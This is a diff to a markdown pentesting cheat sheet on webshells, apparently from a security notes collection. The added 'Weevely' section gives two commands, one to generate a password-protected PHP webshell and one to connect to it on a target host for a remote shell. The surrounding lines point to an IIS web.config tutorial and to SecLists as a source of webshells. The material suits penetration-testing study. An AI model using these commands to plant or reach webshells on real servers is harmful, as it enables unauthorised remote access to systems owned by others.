@@ -158,6 +158,20 @@ This text was extracted from:
 
 {% embed url="https://www.ivoidwarranties.tech/posts/pentesting-tuts/iis/web-config/" %}
 
+## Weevely
+
+Using weevely we can create php webshells easily.
+
+```text
+weevely generate password /root/webshell.php
+```
+
+Not we execute it and get a shell in return:
+
+```text
+weevely "http://ip/webshell.php" password
+```
+
 ## SecLists Shells
 
 [SecLists](https://github.com/danielmiessler/SecLists) is an awesome collection of wordlists, it also includes webshells:
